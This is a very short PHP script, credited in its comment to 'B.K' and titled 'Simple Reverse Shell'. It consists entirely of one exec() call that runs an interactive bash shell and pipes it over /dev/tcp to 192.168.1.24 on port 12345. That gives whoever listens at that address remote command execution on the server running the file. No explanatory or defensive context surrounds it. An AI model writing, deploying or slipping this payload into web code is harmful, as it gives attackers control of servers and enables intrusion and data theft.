<?php
/* 
-- Created by B.K 
-- Simple Reverse Shell
*/
exec("/bin/bash -c 'exec bash -i &>/dev/tcp/192.168.1.24/12345 <&1'");